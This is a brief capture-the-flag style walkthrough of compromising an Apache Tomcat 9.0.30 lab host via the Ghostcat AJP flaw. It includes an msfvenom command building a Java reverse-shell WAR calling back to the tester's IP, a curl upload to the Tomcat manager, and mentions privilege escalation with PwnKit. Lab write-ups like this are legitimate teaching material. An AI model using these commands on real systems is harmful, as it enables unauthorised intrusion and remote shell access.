Started with a nmap scan
```
8009 Apache jserv v1.3
8080 Apache Tomcat 9.0.30
```
Running a gobuster scan
```
/docs/
/examples
/manager
```

Just doing a quick search of version numbers I found that its vulnerable to `Ghost cat` we read the `/WEB-INF/web.xml` file and it has some notes from the company and a login for a webdev account `webdev:Hgj3......1` we can use this login to get access to the host manager and looks like this user also has the GUI disabled  so we can try and make a war file using msfvenom 
`msfvenom -p java/shell_reverse_tcp LHOST=10.13.8.255 LPORT=4443 -f war -o shell.war` 
And now we can upload a war file
`curl --user 'webdev' --upload-file shell.war http://10.10.200.224:8080/manger/text/deploy?path=/shell.war` 
And now we have a shell onto the webserver and then go to the browser and download the file and we will get a call back as the web sever doing a linpeas scan we can just get root using PwnKit